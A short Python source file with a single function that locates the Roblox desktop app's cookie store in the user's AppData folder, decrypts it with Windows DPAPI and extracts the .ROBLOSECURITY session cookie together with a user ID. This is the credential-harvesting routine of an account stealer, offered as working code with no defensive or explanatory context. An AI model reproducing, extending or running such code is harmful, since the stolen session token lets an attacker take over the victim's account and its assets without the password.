import os
import json
import base64
import win32crypt
import re

def get_roblox_app_cookie():
    cookie_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\LocalStorage\RobloxCookies.dat"
    if not os.path.exists(cookie_path):
        return None
    try:
        with open(cookie_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        encrypted_data = base64.b64decode(data['CookiesData'])
        decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8')
        cookie_start = decrypted.find('.ROBLOSECURITY')
        if cookie_start != -1:
            cookie_value_start = cookie_start + len('.ROBLOSECURITY')
            while cookie_value_start < len(decrypted) and decrypted[cookie_value_start] in [' ', '\t', '=']:
                cookie_value_start += 1
            cookie_end = decrypted.find('\n', cookie_value_start)
            if cookie_end == -1:
                cookie_end = len(decrypted)
            cookie_value = decrypted[cookie_value_start:cookie_end].strip()
            if cookie_value and len(cookie_value) > 50:
                user_id = "Unknown"
                user_match = re.search(r'(\d{15,20})', cookie_value)
                if user_match:
                    user_id = user_match.group(1)
                return {
                    'cookie': cookie_value,
                    'user_id': user_id
                }
        return None
    except Exception:
        return None
